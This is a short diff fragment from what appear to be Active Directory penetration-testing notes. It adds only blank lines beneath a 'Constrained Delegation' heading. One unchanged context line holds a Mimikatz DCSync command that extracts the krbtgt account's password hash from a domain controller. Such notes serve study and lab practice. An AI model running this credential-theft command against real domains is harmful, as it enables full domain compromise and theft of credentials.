@@ -314,3 +314,8 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 # **Constrained Delegation**
 
 
+
+
+
+
+
